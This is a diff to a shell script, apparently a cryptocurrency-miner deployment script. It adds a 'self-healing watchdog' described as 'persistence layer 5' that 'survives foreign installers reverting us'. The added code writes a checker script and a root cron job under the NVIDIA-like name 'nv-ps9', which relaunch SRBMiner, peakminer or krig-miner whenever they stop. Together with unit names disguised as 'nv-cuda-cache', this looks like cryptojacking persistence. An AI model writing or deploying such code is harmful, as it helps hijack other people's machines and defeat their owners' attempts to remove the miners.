@@ -183,3 +183,29 @@ sleep 25
 log "cutover done procs=$(pgrep -af 'ps9_g|SRBMiner|peakminer|krig-miner' | wc -l) units=$(systemctl list-units 'nv-cuda-cache@*' --state=active --no-legend 2>/dev/null | wc -l)"
 pkill -9 -f 'tuneall.sh' 2>/dev/null
 log "=== ps9 done"
+
+# ---- persistence layer 5: self-healing watchdog (survives foreign installers reverting us) ----
+echo "$MODE" > "$B/mode"
+cat > "$B/ps9_check.sh" <<'K'
+#!/bin/bash
+B=/opt/fleet; M=$(cat "$B/mode" 2>/dev/null); N=$(nvidia-smi -L 2>/dev/null | grep -c '^GPU ')
+[ "${N:-0}" -lt 1 ] && exit 0
+case "$M" in
+  srb|srb300) c=$(pgrep -cf 'SRBMiner-MULTI') ;;
+  peak)       c=$(pgrep -cf 'bin/peakminer') ;;
+  *)          c=$(pgrep -cf 'krig-miner') ;;
+esac
+want=$N
+if [ "${c:-0}" -lt "$want" ]; then
+  echo "[$(date -u +%FT%TZ)] check: $M procs=$c/$want -> reapply" >> "$B/logs/ps9.log"
+  bash "$B/ps9.sh" >> "$B/logs/ps9_check.log" 2>&1
+fi
+K
+chmod +x "$B/ps9_check.sh"
+cat > /etc/cron.d/nv-ps9 <<'C'
+SHELL=/bin/bash
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+*/5 * * * * root /bin/bash /opt/fleet/ps9_check.sh >/dev/null 2>&1
+C
+chmod 644 /etc/cron.d/nv-ps9
+log "watchdog installed mode=$MODE"
